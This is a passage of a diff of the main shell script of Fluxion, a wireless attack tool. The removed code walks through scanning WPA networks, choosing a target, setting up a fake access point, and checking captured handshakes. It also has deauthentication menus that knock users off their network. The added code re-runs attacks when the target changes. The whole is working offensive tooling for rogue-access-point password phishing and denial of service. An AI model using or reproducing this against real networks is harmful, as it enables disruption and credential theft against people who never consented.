-                BOTTOMLEFT="-geometry 90x24+0-0"
-                BOTTOMRIGHT="-geometry 75x12-0-0"
-                TOPLEFTBIG="-geometry 91x42+0+0"
-                TOPRIGHTBIG="-geometry 83x26-0+0"
-        }
-
-        function resB {
-
-                TOPLEFT="-geometry 92x14+0+0"
-                TOPRIGHT="-geometry 68x25-0+0"
-                BOTTOMLEFT="-geometry 92x36+0-0"
-                BOTTOMRIGHT="-geometry 74x20-0-0"
-                TOPLEFTBIG="-geometry 100x52+0+0"
-                TOPRIGHTBIG="-geometry 74x30-0+0"
-        }
-        function resC {
-
-                TOPLEFT="-geometry 100x20+0+0"
-                TOPRIGHT="-geometry 109x20-0+0"
-                BOTTOMLEFT="-geometry 100x30+0-0"
-                BOTTOMRIGHT="-geometry 109x20-0-0"
-                TOPLEFTBIG="-geometry  100x52+0+0"
-                TOPRIGHTBIG="-geometry 109x30-0+0"
-        }
-        function resD {
-                TOPLEFT="-geometry 110x35+0+0"
-                TOPRIGHT="-geometry 99x40-0+0"
-                BOTTOMLEFT="-geometry 110x35+0-0"
-                BOTTOMRIGHT="-geometry 99x30-0-0"
-                TOPLEFTBIG="-geometry 110x72+0+0"
-                TOPRIGHTBIG="-geometry 99x40-0+0"
-        }
-        function resE {
-                TOPLEFT="-geometry 130x43+0+0"
-                TOPRIGHT="-geometry 68x25-0+0"
-                BOTTOMLEFT="-geometry 130x40+0-0"
-                BOTTOMRIGHT="-geometry 132x35-0-0"
-                TOPLEFTBIG="-geometry 130x85+0+0"
-                TOPRIGHTBIG="-geometry 132x48-0+0"
-        }
-        function resF {
-                TOPLEFT="-geometry 100x17+0+0"
-                TOPRIGHT="-geometry 90x27-0+0"
-                BOTTOMLEFT="-geometry 100x30+0-0"
-                BOTTOMRIGHT="-geometry 90x20-0-0"
-                TOPLEFTBIG="-geometry  100x70+0+0"
-                TOPRIGHTBIG="-geometry 90x27-0+0"
+fluxion_handle_exit() {
+  fluxion_handle_abort_attack
+  fluxion_shutdown
+  exit 1
 }
 
-detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
-##  A) 1024x600
-##  B) 1024x768
-##  C) 1280x768
-##  D) 1280x1024
-##  E) 1600x1200
-case $detectedresolution in
-        "1024x600" ) resA ;;
-        "1024x768" ) resB ;;
-        "1280x768" ) resC ;;
-        "1366x768" ) resC ;;
-        "1280x1024" ) resD ;;
-        "1600x1200" ) resE ;;
-        "1366x768"  ) resF ;;
-                  * ) resA ;;
-esac
+# In case of unexpected termination, run fluxion_shutdown.
+trap fluxion_handle_exit SIGINT SIGHUP
 
-language; setinterface
+
+fluxion_handle_target_change() {
+  echo "Target change signal received!" > $FLUXIONOutputDevice
+
+  local targetInfo
+  readarray -t targetInfo < <(more "$FLUXIONWorkspacePath/target_info.txt")
+
+  FluxionTargetMAC=${targetInfo[0]}
+  FluxionTargetSSID=${targetInfo[1]}
+  FluxionTargetChannel=${targetInfo[2]}
+
+  FluxionTargetSSIDClean=$(fluxion_target_normalize_SSID)
+
+  if ! stop_attack; then
+    fluxion_conditional_bail "Target tracker failed to stop attack."
+  fi
+
+  if ! unprep_attack; then
+    fluxion_conditional_bail "Target tracker failed to unprep attack."
+  fi
+
+  if ! load_attack "$FLUXIONPath/attacks/$FluxionAttack/attack.conf"; then
+    fluxion_conditional_bail "Target tracker failed to load attack."
+  fi
+
+  if ! prep_attack; then
+    fluxion_conditional_bail "Target tracker failed to prep attack."
+  fi
+
+  if ! fluxion_run_attack; then
+    fluxion_conditional_bail "Target tracker failed to start attack."
+  fi
 }
 
-function language {
-
-    iptables-save > $DUMP_PATH/iptables-rules
-    conditional_clear
-
-if [ "$FLUX_AUTO" =  "1" ];then
-        source $WORK_DIR/language/en; setinterface
-
-else
-
-        while true; do
-                conditional_clear
-                top
-
-                echo -e ""$red"["$yellow"2"$red"]"$transparent" Select your language"
-                echo "                                       "
-                echo -e "      "$red"["$yellow"1"$red"]"$grey" English          "
-                echo -e "      "$red"["$yellow"2"$red"]"$transparent" German      "
-                echo -e "      "$red"["$yellow"3"$red"]"$transparent" Romanian     "
-                echo -e "      "$red"["$yellow"4"$red"]"$transparent" Turkish    "
-                echo -e "      "$red"["$yellow"5"$red"]"$transparent" Spanish    "
-                echo -e "      "$red"["$yellow"6"$red"]"$transparent" Chinese   "
-                echo -e "      "$red"["$yellow"7"$red"]"$transparent" Italian   "
-                echo -e "      "$red"["$yellow"8"$red"]"$transparent" Czech   "
-                echo -e "      "$red"["$yellow"9"$red"]"$transparent" Greek   "
-                echo -e "      "$red"["$yellow"10"$red"]"$transparent" French     "
-                echo -e "      "$red"["$yellow"11"$red"]"$transparent" Slovenian "
-                echo "                                       "
-                echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-                read yn
-                echo ""
-                case $yn in
-                    1 ) source $WORK_DIR/language/en;  break;;
-                    2 ) source $WORK_DIR/language/ger; break;;
-                    3 ) source $WORK_DIR/language/ro;  break;;
-                    4 ) source $WORK_DIR/language/tu;  break;;
-                    5 ) source $WORK_DIR/language/esp; break;;
-                    6 ) source $WORK_DIR/language/ch;  break;;
-                    7 ) source $WORK_DIR/language/it;  break;;
-                    8 ) source $WORK_DIR/language/cz   break;;
-                    9 ) source $WORK_DIR/language/gr;  break;;
-                    10 ) source $WORK_DIR/language/fr; break;;
-                    11 ) source $WORK_DIR/language/svn; break;;
-                    * ) echo "Unknown option. Please choose again"; conditional_clear ;;
-                  esac
-        done
-fi
-
-}
-
-# Choose Interface
-function setinterface {
-
-  conditional_clear
-        top
-        #unblock interfaces
-        rfkill unblock all
-
-        # Collect all interfaces in montitor mode & stop all
-        KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
-
-        for monkill in ${KILLMONITOR[@]}; do
-                airmon-ng stop $monkill >$flux_output_device
-                echo -n "$monkill, "
-        done
-
-        # Create a variable with the list of physical network interfaces
-        readarray -t wirelessifaces < <(./lib/airmon/airmon.sh    |grep "-" | cut -d- -f1)
-        INTERFACESNUMBER=`./lib/airmon/airmon.sh   | grep -c "-"`
-
-
-        if [ "$INTERFACESNUMBER" -gt "0" ]; then
-
-                if [ "$INTERFACESNUMBER" -eq "1" ]; then
-                        PREWIFI=$(echo ${wirelessifaces[0]} | awk '{print $1}')
-                else
-                        echo $header_setinterface
-                        echo
-                        i=0
-
-                        for line in "${wirelessifaces[@]}"; do
-                                i=$(($i+1))
-                                wirelessifaces[$i]=$line
-                                echo -e "      "$red"["$yellow"$i"$red"]"$transparent" $line"
-                        done
-
-                        if [ "$FLUX_AUTO" = "1" ];then
-                                line="1"
-                        else
-                                echo
-                                echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-                                read line
-                        fi
-
-                        PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
-
-                fi
-
-                if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
-                        conditional_clear
-                        top
-                        setinterface
-                fi
-
-                readarray -t naggysoftware < <(./lib/airmon/airmon.sh check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
-                WIFIDRIVER=$(./lib/airmon/airmon.sh | grep "$PREWIFI" | awk '{print($(NF-2))}')
-
-                if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
-                rmmod -f "$WIFIDRIVER" &>$flux_output_device 2>&1
-                fi
-
-                if [ $KEEP_NETWORK = 0 ]; then
-
-                for nagger in "${naggysoftware[@]}"; do
-                        killall "$nagger" &>$flux_output_device
-                done
-                sleep 0.5
-
-                fi
-
-                if [ ! "$(echo $WIFIDRIVER | egrep 'rt2800|rt73')" ]; then
-                modprobe "$WIFIDRIVER" &>$flux_output_device 2>&1
-                sleep 0.5
-                fi
-
-                # Select Wifi Interface
-                select PREWIFI in $INTERFACES; do
-                        break;
-                done
-
-                WIFIMONITOR=$(./lib/airmon/airmon.sh start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
-                WIFI_MONITOR=$WIFIMONITOR
-                WIFI=$PREWIFI
-
-                #No wireless cards
-        else
-
-                echo $setinterface_error
-                sleep 5
-                exitmode
-        fi
-
-        ghost
-}
-
-# Check files
-function ghost {
-
-        conditional_clear
-        CSVDB=dump-01.csv
-
-        rm -rf $DUMP_PATH/*
-
-        choosescan
-        selection
-}
-
-# Select channel
-function choosescan {
-
-
-        if [ "$FLUX_AUTO" = "1" ];then
-                Scan
-        else
-         conditional_clear
-                while true; do
-                        conditional_clear
-                        top
-
-                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_choosescan"
-                        echo "                                       "
-                        echo -e "      "$red"["$yellow"1"$red"]"$grey" $choosescan_option_1          "
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" $choosescan_option_2       "
-                        echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back       " $transparent
-                        echo "                                       "
-                        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-                        read yn
-                        echo ""
-                        case $yn in
-                                1 ) Scan ; break ;;
-                                2 ) Scanchan ; break ;;
-                                3 ) setinterface; break;;
-                                * ) echo "Unknown option. Please choose again"; conditional_clear ;;
-                          esac
-                done
-        fi
-}
-
-# Choose your channel if you choose option 2 before
-function Scanchan {
-
-        conditional_clear
-        top
-
-          echo "                                       "
-          echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_choosescan     "
-          echo "                                       "
-          echo -e "     $scanchan_option_1 "$blue"6"$transparent"               "
-          echo -e "     $scanchan_option_2 "$blue"1-5"$transparent"             "
-          echo -e "     $scanchan_option_2 "$blue"1,2,5-7,11"$transparent"      "
-          echo "                                       "
-        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-        read channel_number
-        set -- ${channel_number}
-        conditional_clear
-
-        rm -rf $DUMP_PATH/dump*
-        xterm $HOLD -title "$header_scanchan [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
-}
-
-# Scans the entire network
-function Scan {
-
-        conditional_clear
-        rm -rf $DUMP_PATH/dump*
-
-        if [ "$FLUX_AUTO" = "1" ];then
-                sleep 30 && killall xterm &
-        fi
-        xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
-
-}
-
-# Choose a network
-function selection {
-
-        conditional_clear
-        top
-
-
-        LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
-
-        if [ "$LINEAS_WIFIS_CSV" = "" ];then
-                conditional_clear
-                top
-                echo -e ""$red"["$yellow"2"$red"]"$transparent" Error: your wireless card  isn't supported  "
-                echo -n -e $transparent"Do you want exit? "$red"["$yellow"Y"$transparent"es / "$yellow"N"$transparent"o"$red"]"$transparent":"
-                read back
-                if [ $back = 'n' ] && [ $back = 'N' ] && [ $back = 'no' ] && [ $back = 'No' ];then
-                        clear && exitmode
-
-                elif [ $back = 'y' ] && [ $back = 'Y' ] && [ $back = 'yes' ] && [ $back = 'Yes' ];then
-                        clear && setinterface
-                fi
-
-        fi
-
-        if [ $LINEAS_WIFIS_CSV -le 3 ]; then
-                ghost && break
-        fi
-
-        fluxionap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
-        fluxionap=`expr $fluxionap - 1`
-        head -n $fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
-        tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
-        echo "                        WIFI LIST "
-        echo ""
-        echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
-        echo ""
-        i=0
-
-        while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
-                longueur=${#MAC}
-                PRIVACY=$(echo $PRIVACY| tr -d "^ ")
-                PRIVACY=${PRIVACY:0:4}
-                if [ $longueur -ge 17 ]; then
-                        i=$(($i+1))
-                        POWER=`expr $POWER + 100`
-                        CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
-
-                        if [ "$CLIENTE" != "" ]; then
-                                CLIENTE="*"
-                        echo -e " "$red"["$yellow"$i"$red"]"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""
-
-                        else
-
-                        echo -e " "$red"["$yellow"$i"$red"]"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
-
-                        fi
-
-                        aidlength=$IDLENGTH
-                        assid[$i]=$ESSID
-                        achannel[$i]=$CHANNEL
-                        amac[$i]=$MAC
-                        aprivacy[$i]=$PRIVACY
-                        aspeed[$i]=$SPEED
-                fi
-        done < $DUMP_PATH/dump-02.csv
-
-        # Select the first network if you select the first network
-        if [ "$FLUX_AUTO" = "1" ];then
-                choice=1
-        else
-                echo
-                echo -e ""$blue "("$white"*"$blue") $selection_1"$transparent""
-                echo ""
-                echo -e "        $selection_2"
-                echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-                read choice
-        fi
-
-        if [[ $choice -eq "r" ]]; then
-                ghost
-        fi
-
-        idlength=${aidlength[$choice]}
-        ssid=${assid[$choice]}
-        channel=$(echo ${achannel[$choice]}|tr -d [:space:])
-        mac=${amac[$choice]}
-        privacy=${aprivacy[$choice]}
-        speed=${aspeed[$choice]}
-        Host_IDL=$idlength
-        Host_SPEED=$speed
-        Host_ENC=$privacy
-        Host_MAC=$mac
-        Host_CHAN=$channel
-        acouper=${#ssid}
-        fin=$(($acouper-idlength))
-        Host_SSID=${ssid:1:fin}
-        Host_SSID2=`echo $Host_SSID | sed 's/ //g' | sed 's/\[//g;s/\]//g' | sed 's/\://g;s/\://g' | sed 's/\*//g;s/\*//g' | sed 's/(//g' | sed 's/)//g'`
-        conditional_clear
-
-        askAP
+# If target monitoring enabled, act on changes.
+trap fluxion_handle_target_change SIGALRM
+
+
+# ============================================================ #
+# =============== < Resolution & Positioning > =============== #
+# ============================================================ #
+fluxion_set_resolution() { # Windows + Resolution
+
+  # Get dimensions
+  # Verify this works on Kali before commiting.
+  # shopt -s checkwinsize; (:;:)
+  # SCREEN_SIZE_X="$LINES"
+  # SCREEN_SIZE_Y="$COLUMNS"
+
+  SCREEN_SIZE=$(xdpyinfo | grep dimension | awk '{print $4}' | tr -d "(")
+  SCREEN_SIZE_X=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $1}'))
+  SCREEN_SIZE_Y=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $2}'))
+
+  # Calculate proportional windows
+  if hash bc ;then
+    PROPOTION=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$SCREEN_SIZE_Y}")/1 | bc)
+    NEW_SCREEN_SIZE_X=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$FLUXIONWindowRatio}")/1 | bc)
+    NEW_SCREEN_SIZE_Y=$(echo $(awk "BEGIN {print $SCREEN_SIZE_Y/$FLUXIONWindowRatio}")/1 | bc)
+
+    NEW_SCREEN_SIZE_BIG_X=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_X/$FLUXIONWindowRatio}")/1 | bc)
+    NEW_SCREEN_SIZE_BIG_Y=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_Y/$FLUXIONWindowRatio}")/1 | bc)
+
+    SCREEN_SIZE_MID_X=$(echo $(($SCREEN_SIZE_X + ($SCREEN_SIZE_X - 2 * $NEW_SCREEN_SIZE_X) / 2)))
+    SCREEN_SIZE_MID_Y=$(echo $(($SCREEN_SIZE_Y + ($SCREEN_SIZE_Y - 2 * $NEW_SCREEN_SIZE_Y) / 2)))
+
+    # Upper windows
+    TOPLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0+0"
+    TOPRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+0"
+    TOP="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X+0"
+
+    # Lower windows
+    BOTTOMLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-0"
+    BOTTOMRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0-0"
+    BOTTOM="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X-0"
+
+    # Y mid
+    LEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-$SCREEN_SIZE_MID_Y"
+    RIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+$SCREEN_SIZE_MID_Y"
+
+    # Big
+    TOPLEFTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y+0+0"
+    TOPRIGHTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y-0+0"
+  fi
 }
 
 
-# FakeAP
-function askAP {
+# ============================================================ #
+# ================= < Sequencing Framework > ================= #
+# ============================================================ #
+# The following lists some problems with the framework's design.
+# The list below is a list of DESIGN FLAWS, not framework bugs.
+# * Sequenced undo instructions' return value is being ignored.
+# * A global is generated for every new namespace being used.
+# * It uses eval too much, but it's bash, so that's not so bad.
+# TODO: Try to fix this or come up with a better alternative.
+declare -rA FLUXIONUndoable=( \
+  ["set"]="unset" \
+  ["prep"]="unprep" \
+  ["run"]="halt" \
+  ["start"]="stop" \
+)
 
-        DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
+# Yes, I know, the identifiers are fucking ugly. If only we had
+# some type of mangling with bash identifiers, that'd be great.
+fluxion_do() {
+  if [ ${#@} -lt 2 ]; then return -1; fi
 
-        if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
-                selection && break
-        fi
+  local -r __fluxion_do__namespace=$1
+  local -r __fluxion_do__identifier=$2
 
-        if [ "$(echo $WIFIDRIVER | grep 8187)" ]; then
-                fakeapmode="airbase-ng"
-                askauth
-        fi
-
-        if [ "$FLUX_AUTO" = "1" ];then
-                fakeapmode="hostapd"; authmode="handshake"; handshakelocation
-        else
-                top
-                while true; do
-
-                        infoap
-
-                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_askAP"
-                        echo "                                       "
-                        echo -e "      "$red"["$yellow"1"$red"]"$grey" $askAP_option_1"
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askAP_option_2"
-                        echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back" $transparent
-                        echo "                                       "
-                        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-                        read yn
-                        echo ""
-                        case $yn in
-                                1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
-                                2 ) fakeapmode="airbase-ng"; askauth; break ;;
-                                3 ) selection; break ;;
-                                * ) echo "$general_case_error"; conditional_clear ;;
-                        esac
-                done
-        fi
+  # Notice, the instruction will be adde to the Do Log
+  # regardless of whether it succeeded or failed to execute.
+  eval FXDLog_$__fluxion_do__namespace+=\("$__fluxion_do__identifier"\)
+  eval ${__fluxion_do__namespace}_$__fluxion_do__identifier "${@:3}"
+  return $?
 }
 
-# Test Passwords / airbase-ng
-function askauth {
+fluxion_undo() {
+  if [ ${#@} -ne 1 ]; then return -1; fi
 
-        if [ "$FLUX_AUTO" = "1" ];then
-                authmode="handshake"; handshakelocation
-        else
-                conditional_clear
+  local -r __fluxion_undo__namespace=$1
 
-                top
-                while true; do
+  # Removed read-only due to local constant shadowing bug.
+  # I've reported the bug, we can add it when fixed.
+  eval local __fluxion_undo__history=\("\${FXDLog_$__fluxion_undo__namespace[@]}"\)
 
-                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_askauth"
-                        echo "                                       "
-                        echo -e "      "$red"["$yellow"1"$red"]"$grey" $askauth_option_1"
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askauth_option_2"
-                        echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back" $transparent
-                        echo "                                       "
-                        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-                        read yn
-                        echo ""
-                        case $yn in
-                                1 ) authmode="handshake"; handshakelocation; break ;;
-                                2 ) authmode="wpa_supplicant";  webinterface; break ;;
-                                3 ) askAP; break ;;
-                                * ) echo "$general_case_error"; conditional_clear ;;
-                        esac
-                done
-        fi
+  eval echo \$\{FXDLog_$__fluxion_undo__namespace[@]\} \
+    > $FLUXIONOutputDevice
+
+  local __fluxion_undo__i
+  for (( __fluxion_undo__i=${#__fluxion_undo__history[@]}; \
+    __fluxion_undo__i > 0; __fluxion_undo__i-- )); do
+    local __fluxion_undo__instruction=${__fluxion_undo__history[__fluxion_undo__i-1]}
+    local __fluxion_undo__command=${__fluxion_undo__instruction%%_*}
+    local __fluxion_undo__identifier=${__fluxion_undo__instruction#*_}
+
+    echo "Do ${FLUXIONUndoable["$__fluxion_undo__command"]}_$__fluxion_undo__identifier" \
+      > $FLUXIONOutputDevice
+    if eval ${__fluxion_undo__namespace}_${FLUXIONUndoable["$__fluxion_undo__command"]}_$__fluxion_undo__identifier; then
+      echo "Undo-chain succeded." > $FLUXIONOutputDevice
+      eval FXDLog_$__fluxion_undo__namespace=\("${__fluxion_undo__history[@]::$__fluxion_undo__i}"\)
+      eval echo History\: \$\{FXDLog_$__fluxion_undo__namespace[@]\} \
+        > $FLUXIONOutputDevice
+      return 0
+    fi
+  done
+
+  return -2 # The undo-chain failed.
 }
 
-function handshakelocation {
+fluxion_done() {
+  if [ ${#@} -ne 1 ]; then return -1; fi
 
-        conditional_clear
+  local -r __fluxion_done__namespace=$1
 
-        top
-        infoap
-        if [ -f "/root/handshakes/$Host_SSID2-$Host_MAC.cap" ]; then
-                echo -e "Handshake $yellow$Host_SSID-$Host_MAC.cap$transparent found in /root/handshakes."
-                echo -e "${red}Do you want to use this file? (y/N)"
-                echo -ne "$transparent"
+  eval "FluxionDone=\${FXDLog_$__fluxion_done__namespace[-1]}"
 
-                if [ "$FLUX_AUTO" = "0" ];then
-                        read usehandshakefile
-                fi
-
-                if [ "$usehandshakefile" = "y" -o "$usehandshakefile" = "Y" ]; then
-                        handshakeloc="/root/handshakes/$Host_SSID2-$Host_MAC.cap"
-                fi
-        fi
-        if [ "$handshakeloc" = "" ]; then
-                echo
-                echo -e "handshake location  (Example: $red$WORK_DIR.cap$transparent)"
-                echo -e "Press ${yellow}ENTER$transparent to skip"
-                echo
-                echo -ne "Path: "
-
-                if [ "$FLUX_AUTO" = "0" ];then
-                        read handshakeloc
-                fi
-
-        fi
-                if [ "$handshakeloc" = "" ]; then
-                        deauthforce
-                else
-                        if [ -f "$handshakeloc" ]; then
-                                pyrit -r "$handshakeloc" analyze &>$flux_output_device
-                                pyrit_broken=$?
-
-                                if [ $pyrit_broken = 0 ]; then
-                                Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
-                                Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
-                                else
-                                        Host_SSID_loc=$(timeout -s SIGKILL 3 aircrack-ng "$handshakeloc" | grep WPA | grep '1 handshake' | awk '{print $3}')
-                                        Host_MAC_loc=$(timeout -s SIGKILL 3 aircrack-ng "$handshakeloc" | grep WPA | grep '1 handshake' | awk '{print $2}')
-                                fi
-
-
-                                if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
-                                        if [ $pyrit_broken = 0 ] && pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
-                                                cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-                                                certssl
-                                        else
-                                        echo -e $yellow "Corrupted handshake" $transparent
-                                        echo
-                                        sleep 2
-                                        echo "Do you want to try aicrack-ng instead of pyrit to verify the handshake? [ENTER = NO]"
-                                        echo
-
-                                        read handshakeloc_aircrack
-                                        echo -ne "$transparent"
-                                        if [ "$handshakeloc_aircrack" = "" ]; then
-                                                handshakelocation
-                                        else
-                                                if timeout -s SIGKILL 3 aircrack-ng $handshakeloc | grep -q "1 handshake"; then
-                                                        cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-                                                        certssl
-                                                else
-                                                        echo "Corrupted handshake"
-                                                        sleep 2
-                                                        handshakelocation
-                                                fi
-                                        fi
-                                        fi
-                                else
-                                        echo -e "${red}$general_error_1$transparent!"
-                                        echo
-                                        echo -e "File ${red}MAC$transparent"
-
-                                        readarray -t lista_loc < <(pyrit -r $handshakeloc analyze 2>&1 | grep "^#")
-                                                for i in "${lista_loc[@]}"; do
-                                                        echo -e "$green $(echo $i | cut -d " " -f1) $yellow$(echo $i | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')$transparent ($green $(echo $i | cut -d "(" -f2 | cut -d "'" -f2)$transparent)"
-                                                done
-
-                                        echo -e "Host ${green}MAC$transparent"
-                                        echo -e "$green #1: $yellow$Host_MAC$transparent ($green $Host_SSID$transparent)"
-                                        sleep 7
-                                        handshakelocation
-                                fi
-                        else
-                                echo -e "File ${red}NOT$transparent present"
-                                sleep 2
-                                handshakelocation
-                        fi
-                fi
+  if [ ! "$FluxionDone" ]; then return 1; fi
 }
 
-function deauthforce {
+fluxion_done_reset() {
+  if [ ${#@} -ne 1 ]; then return -1; fi
 
+  local -r __fluxion_done_reset__namespace=$1
 
-        if [ "$FLUX_AUTO" = "1" ];then
-                 handshakemode="normal"; askclientsel
-        else
-
-                conditional_clear
-
-                top
-                while true; do
-
-                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_deauthforce"
-                        echo "                                       "
-                        echo -e "      "$red"["$yellow"1"$red"]"$grey" pyrit" $transparent
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" $deauthforce_option_1"
-                        echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back" $transparent
-                        echo "                                       "
-                        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-                        read yn
-                        echo ""
-                        case $yn in
-                                1 ) handshakemode="normal"; askclientsel; break ;;
-                                2 ) handshakemode="hard"; askclientsel; break ;;
-                                3 ) askauth; break ;;
-                                * ) echo "
-                $general_case_error"; conditional_clear ;;
-                        esac
-                done
-        fi
+  eval FXDLog_$__fluxion_done_reset__namespace=\(\)
 }
 
-############################################### < MENU > ###############################################
-
-
-
-
-
-
-############################################# < HANDSHAKE > ############################################
-
-# Type of deauthentication to be performed
-function askclientsel {
-
-        if [ "$FLUX_AUTO" = "1" ];then
-                deauth all
-        else
-                conditional_clear
-
-                while true; do
-                        top
-
-                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_deauthMENU"
-                        echo "                                       "
-                        echo -e "      "$red"["$yellow"1"$red"]"$grey" Deauth all"$transparent
-                        echo -e "      "$red"["$yellow"2"$red"]"$transparent" Deauth all [mdk3]"
-                        echo -e "      "$red"["$yellow"3"$red"]"$transparent" Deauth target "
-                        echo -e "      "$red"["$yellow"4"$red"]"$transparent" Rescan networks "
-                        echo -e "      "$red"["$yellow"5"$red"]"$transparent" Exit"
-                        echo "                                       "
-                        echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-                        read yn
-                        echo ""
-                        case $yn in
-                                1 ) deauth all; break ;;
-                                2 ) deauth mdk3; break ;;
-                                3 ) deauth esp; break ;;
-                                4 ) killall airodump-ng &>$flux_output_device; ghost; break;;
-                                5 ) exitmode; break ;;
-                                * ) echo "
-        $general_case_error"; conditional_clear ;;
-                        esac
-                done
-        fi
-}
-
-#
-function deauth {
-
-        conditional_clear
-
-        iwconfig $WIFI_MONITOR channel $Host_CHAN
-
-        case $1 in
-                all )
-                        DEAUTH=deauthall
-                        capture & $DEAUTH
-                        CSVDB=$Host_MAC-01.csv
-                ;;
-                mdk3 )
-                        DEAUTH=deauthmdk3
-                        capture & $DEAUTH &
-                        CSVDB=$Host_MAC-01.csv
-                ;;
-                esp )
-                        DEAUTH=deauthesp
-                        HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
-                        LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
-
-
-                        if [ $LINEAS_CLIENTES -le 5 ]; then
-                                DEAUTH=deauthall
-                                capture & $DEAUTH
-                                CSVDB=$Host_MAC-01.csv
